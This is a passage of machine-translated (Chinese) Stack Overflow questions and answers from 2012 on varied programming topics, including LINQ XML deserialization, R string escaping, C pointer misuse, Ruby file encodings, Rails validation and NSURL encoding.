    <propulsion>SteamTurbine</propulsion>
    <topSpeed>28</topSpeed>
  </ship>
  <ship xsi:type="motorVessel">
    <name>RMS Queen Mary 2</name>
    <description>Last transatlantic passenger liner</description>
    <propulsion>IntegratedElectricPropulsion</propulsion>
    <topSpeed>30</topSpeed>
  </ship>
  <ship xsi:type="motorVessel">
    <name>USS Enterprise</name>
    <description>First nuclear-powered aircraft carrier</description>
    <propulsion>Nuclear</propulsion>
    <topSpeed>33.6</topSpeed>
  </ship>
</ships> 
```

我可以查询 XML 文档并将其内容读入 Ship 对象列表：

```
 XDocument xmlDocument = XDocument.Load("Ships.xml")
        XNamespace xsi = "http://www.w3.org/2001/XMLSchema-instance";

        var records = (from record in xmlDocument.Descendants("ship")
                       let type = record.Attribute(xsi + "type").Value                         
                       select new Ship
                       {
                           Name = (string)record.Element("name"),
                           Description = (string)record.Element("description")
                       }).ToArray<Ship>(); 
```

这将返回以下内容：

```
Ship[0] (type: Ship):
    Name: Cutty Sark
    Description: Tea clipper
Ship[1] (type: Ship):
    Name: Peking
    Description: Windjammer of the Flying P Line
Ship[2] (type: Ship):
    Name: HMS Hood
    Description: Last British battlecruiser
Ship[3] (type: Ship):
    Name: RMS Queen Mary 2
    Description: Last transatlantic passenger liner
Ship[4] (type: Ship):
    Name: USS Enterprise
    Description: First nuclear-powered aircraft carrier 
```

不过，我真正希望能够制作的是：

```
Ship[0] (type: SailingVessel):
    Name: Cutty Sark
    Description: Tea clipper
    Rig: Ship
    NumberOfMasts: 3
Ship[1] (type: SailingVessel):
    Name: Peking
    Description: Windjammer of the Flying P Line
    Rig: Barque
    NumberOfMasts: 4
Ship[2] (type: MotorVessel):
    Name: HMS Hood
    Description: Last British battlecruiser
    Propulsion: SteamTurbine
    TopSpeed: 28
Ship[3] (type: MotorVessel):
    Name: RMS Queen Mary 2
    Description: Last transatlantic passenger liner
    Propulsion: IntegratedElectricPropulsion
    TopSpeed: 30
Ship[4] (type: MotorVessel):
    Name: USS Enterprise
    Description: First nuclear-powered aircraft carrier
    Propulsion: Nuclear
    TopSpeed: 33.6 
```

如何修改 LINQ 查询以根据需要初始化 SailingVessel 对象或 MotorVessel 对象，而不是基础 Ship 对象？

我是否必须进行两次选择，并在每个选择中复制基类属性（名称和描述）的对象初始化？这就是我能想到的，但我讨厌所涉及的代码重复。或者，是否有某种方法可以初始化基类的属性，并可以选择初始化 SailingVessel (Rig, NumberOfMasts) 或 MotorVessel (Propulsion, TopSpeed) 的其他属性？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:44:27.707

我个人会给每种类型一个静态`FromXElement`方法（或构造函数），然后创建一个`Dictionary<string, Func<Ship>>`这样的：

```
var factories = new Dictionary<string, Func<Ship>>
{
     { "sailingVessel", SailingVessel.FromXElement },
     { "motorVessl", MotorVessel.FromXElement },
     ...
}; 
```

那么您的查询将是：

```
var records = from record in xmlDocument.Descendants("ship")
              let type = record.Attribute(xsi + "type").Value 
              select factories[type](record); 
```

你可以给`Ship`类一个受保护的构造函数`XElement`来提取公共属性，留下如下内容：

```
public class SailingVessel : Ship
{
    public Rig Rig { get; set; }
    public int NumberOfMasts { get; set; }

    private SailingVessel(XElement element) : base(element)
    {
        Rig = (Rig) Enum.Parse(typeof(Rig), (string) element.Element("Rig"));
        NumberOfMasts = (int) element.Element("NumberOfMasts");
    }

    // Don't really need this of course - could put constructor calls
    // into your factory instead. I like the flexibility of factory 
    // methods though, e.g. for caching etc.
    public static FromXElement(element)
    {
        return new SailingVessel(element);
    }
} 
```

肯定会涉及到相当多的代码，但它们都相当简单，也很容易测试。

# .net - 将 MSIL 实现为纯汇编？

> ID：11806491
> 
> 赞同：0
> 
> 时间：2012-08-04T06:33:23.440
> 
> 标签：.net, assembly, bytecode, cil

最近，我对汇编语言产生了兴趣。在这样做的过程中，我也对字节码的概念产生了兴趣。因此，当我查看 Microsoft 的 .NET 时，我相当感兴趣，发现它使用一种伪汇编来创建自己的字节码。但是，汇编语言本身给我留下了深刻的印象。对我来说，这似乎是一种更高级别的组装。

我的问题是，这是否可以实现为纯程序集，例如编译的本机代码而不是 JIT/解释的 .NET 字节码？尝试这样的努力是否明智？有什么好处？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-12T10:12:50.453

在某种程度上，将 CIL 转换为特定于机器的装配是可能的。

Marc Gravell 在评论中提到了 Mono AOT，这是一种选择。[如Mono AOT](http://www.mono-project.com/AOT)页面上所列，如果您使用完整的 AOT（没有任何运行时 IL 解释），那么您可以做什么和不能做什么会有一些限制。否则，一些可以转换为机器代码的 IL 是，其余的在运行时会像往常一样被解释。

还有[由 Cosmos 项目创建的 IL2CPU](https://cosmos.codeplex.com/)，它用 C# 创建了一个完整的操作系统。如果没有托管操作系统，就没有 .NET Framework，他们别无选择，只能将 IL 转换为机器代码。IL2CPU 也有其局限性，但我不知道完整的清单。

但归根结底，对于绝大多数 .NET 程序来说，优势很少。您的程序不会运行得更快，您使您的程序难以调试（您的程序或 IL 翻译器中是否存在错误？），如果您的安装最终包含 .NET Framework 本身的部分，安全更新不适用于您的这些位副本。所以，不要这样做，除非你真的知道你在做什么。

# database - 如何将城市、州、国家与用户个人资料表关联起来？

> ID：11806492
> 
> 赞同：1
> 
> 时间：2012-08-04T06:34:04.600
> 
> 标签：database, geolocation

有趣的是，以下问题都没有帮助我：
[如何在 MVC](https://stackoverflow.com/questions/8683362/how-to-organize-country-state-city-browsing-in-mvc)
[City Country State Database](https://stackoverflow.com/questions/1723672/city-country-state-datebase)
[Country/City/state validation](https://stackoverflow.com/questions/2220868/country-city-state-validation)
[Country/State/City Database 中组织国家/州/城市浏览？](https://stackoverflow.com/questions/3382149/country-state-city-database)
[如何根据用户输入的邮政编码/国家/地区进行城市/州/国家/地区代码查找？](https://stackoverflow.com/questions/10387360/how-to-do-a-city-state-country-code-lookup-based-on-zip-country-input-by-the-use)
[城市、州、邮编、国家/地区列表/sql server 表的脚本](https://stackoverflow.com/questions/2289056/city-state-zip-country-list-script-for-sql-server-table)

我看了[一个关于数据库设计的问题，](https://stackoverflow.com/questions/10971300/what-is-the-best-way-to-design-a-city-state-country-table)这在某种程度上很有帮助，但是有些问题没有得到解答。我有3个表如下：

```
Country ( CountryID, CountryCode, CountryName )
Region  ( RegionID, RegionCode, RegionName, CountryID )
City    ( CityID, CityCode, CityName, RegionID ) 
```

我在用户表中有 CityID。问题是如果用户没有状态怎么办？在我的情况下，我应该如何使用下拉菜单？
**在我的情况下，使用基于 ajax 的文本框是毫无疑问的。**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:45:20.033

如果是，您是否尝试根据 cityID 访问国家/地区列表

```
SELECT Country.* FROM Country
LEFT JOIN Region on Region.CountryID = Country.CountryID
LEFT JOIN city on Region.RegionID = city.RegionID
WHERE city.CityID=44 
```

将为城市生产国家。这是你想要的？

生成的国家/地区可用于在下拉列表中设置所选国家/地区。

使用 CityID 对区域运行第二个查询并使用结果自动选择城市的正确区域也可以实现。

# jquery - 禁用在输入中突出显示文本的功能

> ID：11806494
> 
> 赞同：1
> 
> 时间：2012-08-04T06:35:09.387
> 
> 标签：jquery

我想知道是否有一种方法，使用 jQuery，在将插入符号位置设置到已经在输入框中的文本前面时，禁止突出显示文本？

在下面的示例中，将光标放在最左侧的输入框中，然后按 Tab 键。您会注意到，当光标移动到下一个输入时，当插入符号位置更改时，文本会突出显示 - 这就是我希望能够停止的。

```
<input type="text" value="Some text here..." class="populated-text">
<input type="text" value="Any default text you like" class="populated-text">
<input type="text" value="Will be used as empty" class="populated-text">

$('.populated-text').each(function () {
    var input = $(this);
    input.data('blank-value', input.val());
    input.data('data-entered', false);
    input.addClass('grayed');
    input.keydown(keyDown);
    input.blur(blur);
    input.focus(focus);
    input.mousedown(mouse);
    input.mouseup(mouse);
}); 
```

这是一个示例：http: [//jsfiddle.net/t5HMy/](http://jsfiddle.net/t5HMy/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:08:47.047

试试这个：

```
$('input').focus(function() {
   var $that = $(this);            
   setTimeout(function() {
       $that.selectRange(0,0); 
   }, 1)
}) 
```

[演示](http://jsfiddle.net/t5HMy/9/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:43:38.137

请参阅这个有效的 jQuery[示例](http://jsfiddle.net/t5HMy/7/)。

使用 jQuery，您可以在用户尝试聚焦时引发模糊事件。这将阻止他们输入文本。

```
$("#elem").focus(function() {
    $(this).blur();
}): 
```

同样使用 CSS，显然这可能不适用于旧浏览器。你应该看看这个[问题](https://stackoverflow.com/questions/826782/css-rule-to-disable-text-selection-highlighting)。

```
#elem
{
  -webkit-touch-callout: none;
  -webkit-user-select: none;
  -khtml-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
} 
```

# delphi - 将数据加载到 420 按钮或类似对象中

> ID：11806495
> 
> 赞同：0
> 
> 时间：2012-08-04T06:35:35.437
> 
> 标签：delphi, delphi-4

我有一个程序需要显示剧院公司的座位计划。它希望它能够轻松显示所有有 420 个座位的座位。这些座位由 14 排组成，每排 30 个座位。我希望能够将这些保存回文件中。Dat 或 Inifile，尽管 Inifile 会更轻松，因为我已经为设置创建了。我希望能够点击屏幕上显示的座位，它会显示关于坐在那里的人的所有信息，还有名字等等。该程序必须能够关闭并重新加载数据。我不确定我最好的选择是否是向表单添加 420 个按钮并为其编写一个函数，然后在每个按钮上调用它。如果被占用，按钮将显示红色，如果可用，则显示绿色。稍后将调用这些数据以放置在将要打印的票上。数据应该还可以输入席位、采购商名称、生产名称、Row、Seat number等。这样做最方便的是什么？

# android - 即使在重新启动后，特定小部件实例的小部件 ID 是否永远保持不变？

> ID：11806496
> 
> 赞同：0
> 
> 时间：2012-08-04T06:35:43.323
> 
> 标签：android, configuration, android-widget, android-appwidget

我正在开发一个`AppWidget`使用配置活动来让您自定义小部件行为的工具。自定义必须存储在某处，我的第一个想法是使用*共享首选项*：当配置活动完成时，它将诸如等值存储在共享首选项中`optionA_ID`，`optionB_ID`其中 ID 是 appWidgetId。我的问题是以下一个：`appWidgetId`总是同样，即如果一个小部件实例在创建时的 ID 为 10，那么即使在重新启动之后，该小部件实例是否总是具有相同的 ID？如果没有，那么这种存储自定义的方式将不起作用..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-23T03:40:02.890

基于此[Google Groups](https://groups.google.com/forum/?fromgroups=#!topic/android-developers/rkFtmdmxzl8)帖子，我相信默认行为是**应用小部件的每个实例都有自己的 ID 并永久保留**（当然，除非它被删除并重新添加或其他东西）。此外，电子邮件（来自 AOSP）等所有开源应用程序都将 ID 存储在 SharedPreferences 或 SQLite 数据库中，并使用它来确定应用程序小部件的设置。

# objective-c - 按住以使图像移动

> ID：11806497
> 
> 赞同：-2
> 
> 时间：2012-08-04T06:36:13.893
> 
> 标签：objective-c, ios, xcode, cocoa

我有一个按钮和一个图像。按住按钮时，我希望图像快速在屏幕上播放。现在，我按住它之后，我松手后它就会移动。我需要它在一定时间后开始移动，并在我放手时停止。这是我所拥有的：

```
- (IBAction)buttonDown:(id)sender
{
    [UIView beginAnimations:nil context:nil];
    [UIView setAnimationDuration:0.5];

    x = x + 100;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T10:29:26.977

使用下面的代码，你必须按下 3 秒来移动 _imageView，然后图像开始移动，当你释放按钮时，图像停止。

![ss](../Images/54ff9a2593e32b8e3799739744c424e0.png)

```
- (IBAction)pushToMove:(id)sender {
    [self performSelector:@selector(move) withObject:nil afterDelay:3.0];
}

- (void)move
{
    _nt = [NSTimer scheduledTimerWithTimeInterval:0.1
                                                   target:self
                                                 selector:@selector(goRight)
                                                 userInfo:nil
                                                  repeats:YES];
}

- (void)goRight
{
    _imageView.frame = CGRectMake(_imageView.frame.origin.x + 10, _imageView.frame.origin.y,
                                  _imageView.frame.size.width, _imageView.frame.size.height);
}

- (IBAction)stop
{
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(move) object:nil];
    [_nt invalidate];
} 
```

我把这个示例项目放到了 GitHub 上。您可以下载并运行它。

[https://github.com/weed/p120804_ImageMoveDuringPushButton](https://github.com/weed/p120804_ImageMoveDuringPushButton)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:56:31.183

这可以通过简单地喜欢按钮的 touch down 属性而不是内部的 touch up 来在界面构建器中完成。在代码中它看起来像这样：

```
[myButton addTarget:self action:@selector(myMethod) forControlEvents:UIControlEventTouchDown]; 
```

除此之外，您还需要对动画进行一些状态检查，并`UIViewAnimationOptionBeginFromCurrentState`用作选项来帮助它在用户再次按下按钮时从中断的地方继续。

# ruby-on-rails - 验证非负整数和十进制值

> ID：11806498
> 
> 赞同：45
> 
> 时间：2012-08-04T06:36:14.750
> 
> 标签：ruby-on-rails

我的字段是： `tax rate`并且`tax amount`我想在其中验证正值。

我写了这个验证：

```
:format => { :with => /\A[+]?\d+\Z/} 
```

但它不采用带小数点的数字，如`4.67`. 它给我一个错误。哪种类型的验证适用于整数和浮点值？例如：`2`, `57`,`54.56`应该通过但是`-2.56`,`-87`应该失败。

* * *

## 回答 #1

> 赞同：137
> 
> 时间：2012-08-04T06:43:27.943

这不行吗？

```
validates :your_field, :numericality => { :greater_than_or_equal_to => 0 } 
```

（遵循规则的税收猜测会更正确：）

```
validates :your_field, :numericality => { :greater_than_or_equal_to => 0, :less_than_or_equal_to => 100 } 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-02-16T21:55:38.233

你可以使用：

```
validates :tax_rate, inclusion: { in: 0..5 } 
```

它允许以下值：**0、2、1.2、3.2**

希望能帮助到你！

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2018-09-12T04:39:33.503

你可以使用`validates_numericality_of :amount, :greater_than => 0.0`

# ios - 在 iOS 中将进程名称存储在数组中

> ID：11806500
> 
> 赞同：0
> 
> 时间：2012-08-04T06:36:27.230
> 
> 标签：ios, nsmutablearray

有人可以告诉我我做错了什么吗？

```
 for (i = 0; i < nprocs;  i++) {

            NSString *processName = [NSString stringWithFormat: @"%s",procs[i].kp_proc.p_comm];

            [pid addObject:processName];
            NSLog(@"name: %@", pid[i] );

} 
```

我得到的结果一直是空的..

# r - 如何在 R 字符串中转义反斜杠

> ID：11806501
> 
> 赞同：18
> 
> 时间：2012-08-04T06:37:02.477
> 
> 标签：r, file-io, escaping, backslash

我正在将包含反斜杠 ( `\`) 的字符串写入文件：

```
x1 = "\\str"

x2 = "\\\str"
# Error: '\s' is an unrecognized escape in character string starting "\\\s"

x2="\\\\str"
write(file = 'test', c(x1, x2)) 
```

当我打开名为 的文件时`test`，我看到：

```
\str
\\str 
```

如果我想得到一个包含 5 个反斜杠的字符串，我应该像这样写 10 个反斜杠吗？

```
x = "\\\\\\\\\\str" 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-04T08:01:27.137

> [...]***如果我想得到一个包含 5 的字符串`\`，我应该写 10`\`*** [...]

是的你应该。要将单个`\`字符串写入字符串，请将其写为`"\\"`.

这是因为 the`\`是一个特殊字符，保留用于*转义*它后面的字符。（也许您认为`\n`是换行符。）如果您想编写一个包含单个`"`. 你把它写成`"\""`.

无效的原因`\\\str`是因为它被解释为`\\`（对应于单个`\`）后跟`\s`，这是无效的，因为“转义`s`”没有意义。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-04T06:44:08.397

阅读[本节](http://cran.r-project.org/doc/manuals/R-intro.html#Character-vectors)关于字符向量的内容。

本质上，它表示当您输入字符串文字时，您将它们括在一对引号（“或'）中。在这些引号中，您可以使用 \ 作为转义字符来创建特殊字符。

例如，\n 表示换行或 \" 可用于输入 "，而 R 不会认为它是字符串的结尾。由于 \ 是转义字符，因此您需要一种方法来输入实际的 . 这是通过使用 \\. 脱身脱身！

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-08-04T22:46:53.213

请注意，反斜杠加倍是因为您在命令行输入字符串，并且该字符串首先由 R 解析器解析。您可以以不同的方式输入字符串，其中一些不需要加倍。例如：

```
> tmp <- scan(what='')
1: \\\\\str
2: 
Read 1 item
> print(tmp)
[1] "\\\\\\\\\\str"
> cat(tmp, '\n')
\\\\\str 
> 
```

# c - 带 int 指针的转换代码

> ID：11806503
> 
> 赞同：0
> 
> 时间：2012-08-04T06:37:46.580
> 
> 标签：c, type-conversion

```
#include <stdio.h>
#include <ctype.h>

void readFile(FILE *file);
void count (FILE *file, int *alpha, int *digit, int *punct, int *spaces);
void printMessage(int *alpha, int *digit, int *punct, int *spaces);

int main( void ) {
FILE *file = NULL;
readFile(file);
return 0;
}

void readFile(FILE *file) {
file = fopen("/Users/AdmiralDanny/Desktop/testFile.txt", "r");
int *alpha = NULL, *digit = NULL, *punct = NULL, *space = NULL;
if (file) {
  count(file, alpha, digit, punct, space);
  fclose(file);
} else {
  perror( "error opening the file" );
}
}

void count (FILE *file, int *alpha, int *digit, int *punct, int *spaces) {
  int ch;

 while ((ch = fgetc(file)) != EOF ) {
   if (isalpha(ch) != 0) {
  ++alpha;
  } else if (isdigit(ch)) {
  ++digit;
  } else if (ispunct(ch)) {
  ++punct;
  } else if (isspace(ch)) {
    ++spaces;
  }
}
 printMessage(alpha, digit, punct, spaces);
}

void printMessage(int *alpha, int *digit, int *punct, int *spaces) {
printf( "alphabetic characters: %d\n", alpha );
printf( "digit characters: %d\n", digit);
printf( "punctuation characters: %d\n", punct );
printf( "whitespace characters: %d\n", spaces );
} 
```

我的 .txt 文件只有 4 个空格和 12 个字母字符，但它给了我 48 个字母字符和 8 个空格字符？为什么会这样？另外，当我尝试在 printMessage 方法中打印出 int 指针时，我会收到警告

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T06:39:58.513

没有为任何`int`s 分配内存，`count()`函数只是增加`int`指针而不是`int`值：

```
++spaces; /* spaces is an int* so this increments the pointer. */ 
```

您可以使用`malloc()`，但堆栈分配和传递地址会更简单。

```
int alpha = 0, digit = 0, punct = 0, space = 0;
count(file, &alpha, &digit, &punct, &space); 
```

并在`count()`：

```
(*spaces)++; 
```

取消引用`int`s 以增加和取消引用打印：

```
printf( "whitespace characters: %d\n", *spaces); 
```

由于调用者`count()`不需要`int`s 的更新值，只需按值传递并完全忘记指针（对于 s 也是如此`printMessage()`）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:40:42.757

您可以打印指针指向的地址：

```
printf( "alphabetic characters: %p \n", alpha ); 
```

如果您只想要值：

```
printf( "alphabetic characters: %d\n", *alpha ); 
```

同 *digit, *punct ....

# entity-framework-4 - 实体框架 4.3.1 和 SQL Server CE

> ID：11806507
> 
> 赞同：0
> 
> 时间：2012-08-04T06:38:31.617
> 
> 标签：entity-framework-4, sql-server-ce

我正在使用 SQL Server CE 3.5 和替代 4.0 版本遵循官方教程“EF 4.2 Model & Database First Walkthrough”。不幸的是，我总是得到一个错误：

> EntityException {“底层提供程序在打开时失败。”} db.SaveChanges() 命令。

为什么MS对自己的数据库支持这么差？

# ruby - Windows上的ruby 1.9错误的文件编码

> ID：11806512
> 
> 赞同：3
> 
> 时间：2012-08-04T06:39:12.490
> 
> 标签：ruby, windows, encoding

我有一个包含以下内容的 ruby​​ 文件：

```
# encoding: iso-8859-1
File.open('foo.txt', "w:iso-8859-1") {|f| f << 'fòo'}
puts File.read('foo.txt').encoding 
```

*   当我从 Windows 命令提示符 ruby​​ 1.9.3 运行它时，我得到：IBM437
*   当我从 cygwin ruby​​ 1.9.3 运行它时，我得到：UTF-8
*   我期望得到的是：iso-8859-1

有人可以解释这里发生了什么吗？

**更新**

这是对我正在寻找的内容的更好描述：

*   我现在明白了，感谢 Darshan，默认情况下 ruby​​ 将在 Encoding.default _external 中加载文件，但 # encoding: iso-8859-1 行不应该覆盖它吗？
*   ruby 应该能够自动检测文件的编码吗？是否有任何文件系统的编码是一个属性？
*   “记住”我保存文件的编码的最佳选择是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-04T06:43:21.890

读取文件时没有指定编码。您非常小心地在除那里之外的任何地方指定它，但是您正在使用默认编码读取它。

```
File.open('foo.txt', "w:iso-8859-1") {|f| f << 'fòo'.force_encoding('iso-8859-1')}
File.open('foo.txt', "r:iso-8859-1") {|f| puts f.read().encoding }

# => ISO-8859-1 
```

另请注意，您的意思可能是`'fòo'.encode('iso-8859-1')`而不是`'fòo'.force_encoding('iso-8859-1')`. 后者保持字节不变，而前者对字符串进行转码。

**更新：**我会详细说明一下，因为我没有尽可能清楚或彻底。

1.  如果您不使用 指定编码`File.read()`，则将使用 读取文件`Encoding.default_external`。由于您没有自己设置，Ruby 使用的值取决于它运行的环境。在您的 Windows 环境中，它是 IBM437；在您的 Cygwin 环境中，它是 UTF-8。所以我上面的观点是，这当然就是编码。它必须是，它与文件中包含的字节无关。Ruby 不会为您自动检测编码。

2.  `force_encoding()`不会更改字符串中的字节，它只会更改附加到这些字节的编码。如果你告诉 Ruby“假装这个字符串是 ISO-8859-1”，那么当你告诉它“请把这个字符串写成 ISO-8859-1”时它不会对它们进行转码。 `encode()`为您转码，如果您不欺骗它*不*这样做，则写入文件也是如此。

将它们放在一起，如果您有 ISO-8859-1 中的源文件：

```
# encoding: iso-8859-1

# Write in ISO-8859-1 regardless of default_external
File.open('foo.txt', "w:iso-8859-1") {|f| f << 'fòo'}

# Read in ISO-8859-1 regardless of default_external,
#  transcoding if necessary to default_internal, if set
File.open('foo.txt', "r:iso-8859-1") {|f| puts f.read().encoding } # => ISO-8859-1

puts File.read('foo.txt').encoding # -> Whatever is specified by default_external 
```

如果您有 UTF-8 格式的源文件：

```
# encoding: utf-8

# Write in ISO-8859-1 regardless of default_external, transcoding from UTF-8
File.open('foo.txt', "w:iso-8859-1") {|f| f << 'fòo'}

# Read in ISO-8859-1 regardless of default_external,
#  transcoding if necessary to default_internal, if set
File.open('foo.txt', "r:iso-8859-1") {|f| puts f.read().encoding } # => ISO-8859-1

puts File.read('foo.txt').encoding # -> Whatever is specified by default_external 
```

**更新 2，回答您的新问题：**

1.  不，这`# encoding: iso-8859-1`行没有改变`Encoding.default_external`，它只是告诉 Ruby 源文件本身是用 ISO-8859-1 编码的。只需添加

    ```
    Encoding.default_external = "iso-8859-1" 
    ```

    如果您希望您读取的所有文件都以该编码存储。

2.  不，我个人认为 Ruby 不应该自动检测编码，但有理智的人可能不同意这一点，而且“应该这样”的讨论在这里似乎是题外话。

3.  就个人而言，我对所有内容都使用 UTF-8，并且在我无法控制编码的极少数情况下，我在读取文件时手动设置编码，如上所示。我的源文件总是 UTF-8。如果您正在处理无法控制且不知道其编码的文件，则[charguess gem](https://github.com/fnando/charguess)或类似的会很有用。

# xna - 有人能告诉我这段 HLSL 代码是什么意思吗？

> ID：11806513
> 
> 赞同：1
> 
> 时间：2012-08-04T06:39:15.010
> 
> 标签：xna, hlsl

```
float4 color = tex2D(inputSampler, TexCoord);
     //compute distance from center
float distance = color.a&gt;0.3f?length(TexCoord - 0.5f):1.0f; 
```

什么是`color.a&gt`，为什么`;`第二行中间有一个？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T06:52:40.320

***对原始问题的回应**：“有人能告诉我这段 HLSL 代码是什么意思吗？*

```
float4 color = tex2D(inputSampler, TexCoord);
  //compute distance from center 
float distance = color.a&gt;0.3f?length(TexCoord - 0.5f):1.0f; 
```

*什么是 color.a> 以及为什么有一个；在第二行的中间？”*

* * *

它是一个 html 转义序列搞砸了。`&gt;`应该是`>`（“大于”符号）。

所以应该是：

```
float4 color = tex2D(inputSampler, TexCoord);
     //compute distance from center
float distance = color.a > 0.3f?length(TexCoord - 0.5f):1.0f; 
```

同样，如果您遇到`&lt;`它可能是`<`（“小于”符号）。其他常见的有：

*   `&quot;`->' `"`'
*   `&amp;`->' `&`'
*   `&nbsp;`-> ' ' (空格)

像素着色器实际所做的是，如果此时采样纹理的 alpha 大于`0.3`，`distance`则为从采样 texcoord (U,V) 位置到 (0.5, 0.5) 的长度，即采样的纹理中心。如果 alpha`0.3`小于或等于 ，则`distance`设置为`1.0f`。

距离值显然稍后在着色器中用于应用一些像素效果。

# iphone - 创建 NSURL 时出现错误的 URL

> ID：11806514
> 
> 赞同：-1
> 
> 时间：2012-08-04T06:39:21.167
> 
> 标签：iphone, nsurl

我在服务器上发出请求，在 URL 中有空格

http://xxxxxxxx.com/api/api.php?func=showAllwedsdwewsdsd¶ms[]=Saudi%20Arab¶ms[]=all

我收到错误错误 URL 所以，

我用了

```
 downloadURL = [downloadURL stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; 
```

但由于这个原因，我得到了奇怪的 URL

```
 http://sdsdsdsdsdsd.com/api/api.php?func=showAllsdsd&params5262721536=Saudi              0X0P+0rabia&params5 8288=All 
```

我也在使用

```
 downloadURL= [downloadURL stringByReplacingOccurrencesOfString:@" " withString:@"%20"]; 
```

但又像奇怪的网址

```
 http://xxxxxxxxx.com/api/api.php?func=showsdsdsd&params[]=Saudi 0X1.240DC0D824P-807rabia&params[]=All 
```

请帮助我如何解决这个问题

**编辑**粘贴大部分代码

```
 PropertyXMLDownloader *download=[[PropertyXMLDownloader alloc]init];
  [download setDelegate:self];
   firstAppDelegate *del=(firstAppDelegate *)[[UIApplication sharedApplication]delegate];
   NSLog(@"Country is %@",del.country);
   NSLog(@"State is %@",del.state);
//  del.country=[del.country stringByReplacingOccurrencesOfString:@" " withString:@"%20"];

   NSString *downloadURL=[NSString stringWithFormat:@"http://xxxxxxxx.com/api/api.php?func=showAll&params[]=Saudi Arabia&params[]=%@",@"all"];
      // downloadURL= [downloadURL stringByReplacingOccurrencesOfString:@" " withString:@"%20"];
       //downloadURL = [downloadURL stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];

   NSCharacterSet *doNotWant = [NSCharacterSet characterSetWithCharactersInString:@" "];
   downloadURL = [[downloadURL componentsSeparatedByCharactersInSet: doNotWant]    componentsJoinedByString:@"%20"];

    NSLog(downloadURL); 
    [download startDownloading:downloadURL]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:55:43.043

试试这个。

```
NSCharacterSet *doNotWant = [NSCharacterSet characterSetWithCharactersInString:@" "];
downloadURL = [[downloadURL componentsSeparatedByCharactersInSet: doNotWant]   componentsJoinedByString:@"%20"]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T07:41:53.393

也许 %20 被视为数据参数，如 %@ 或 %g。尝试使用定义 NSString

```
NSString *urlString = [NSString stringWithFormat:@"http://xxxxxxxx.com/api/api.php?func=showAllwedsdwewsdsd&params[]=Saudi%20Arab&params[]=all"]; 
```

你会看到一个警告。通过在百分号前面添加另一个来“转义”百分号：

```
NSString *urlString = [NSString stringWithFormat:@"http://xxxxxxxx.com/api/api.php?func=showAllwedsdwewsdsd&params[]=Saudi**%**%20Arab&params[]=all"]; 
```

警告消失了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T06:47:13.003

你的问题是这样的：

```
NSLog(downloadURL); 
```

尝试将其替换为：

```
NSLog(@"%@", downloadURL); 
```

一切都会奏效。

您可以使用`stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding`并忘记所有解决方法。

（解释：由于`downloadURL`包含 % 符号，它不能很好地与 NSLog 配合使用，它需要一个格式字符串作为它的第一个参数，其中 % 符号标识要替换的占位符）。

# asp.net-mvc - 在 FastCGI、ASP.NET MVC 和服务器应用程序的 Web 表单中，哪一个是最快和最安全的

> ID：11806516
> 
> 赞同：0
> 
> 时间：2012-08-04T06:39:37.477
> 
> 标签：asp.net-mvc, performance, webforms, fastcgi, code-security

我必须构建一个自动聊天应用程序，它将前端作为网站上的小部件和服务器上的后端逻辑。其主要目的是为客户提供一个界面，以便与坐在以服务器为通信点的位置的聊天人员解决他们的查询。如果没有可用的人，则应用程序将解析字符串并尝试通过检查数据库来给出一些答案。

我在 C++ 方面有很好的经验，在 Java 方面有一点经验。该应用程序的主要关注点是源代码安全性和最高效率。

我从服务器端面临的限制是我必须在 IIS 上运行它，并且唯一支持的脚本语言是 PHPv5、ASP、ASP.NET 和 FastCGI。

我不打算使用 PHP，因为我从谷歌搜索中发现可以对它进行逆向工程，而且我需要很多时间来学习一门新语言，所以严格来说不。

我更喜欢使用 FastCGI，因为它可以完全满足我的要求，但我无法找到在 Windows 上使用 C++ 或任何好的教程进行编译的方法。我在 google 上找到的大多数与 FastCGI 开发相关的结果都是关于 Linux 或 Perl for windows。我也无法找到如何在 Windows 平台上编译它的方法。

我现在被迫选择 ASP.NET，这将是我最后的选择，因为它是一种解释性语言，而解释性语言往往不利于逆向工程。

所以任何人都可以建议我如何去做。如果 FastCGI 没有出路，那么在给定的情况下，建议我在 MVC 和 WebForms 中哪个更好。我对他们俩都是新手，我需要在两周内完成申请。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-12T17:47:36.773

FastCGI/C++ 有更好的性能。如果您需要有关操作方法的链接：[http](http://cgi.sourceforge.net/) ://cgi.sourceforge.net/以及更多使用谷歌搜索的链接。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:52:54.127

第一件事。

1.  一切都可以逆向工程。这仅取决于尝试对您的代码进行逆向工程的人的聪明程度。混淆不能替代保护您的代码。如果您的服务器端 PHP 安全地存放在您的服务器上，并配置了所有正确的安全参数，那么您无需担心。但是，如果您还不了解 PHP，那么就足够公平了。

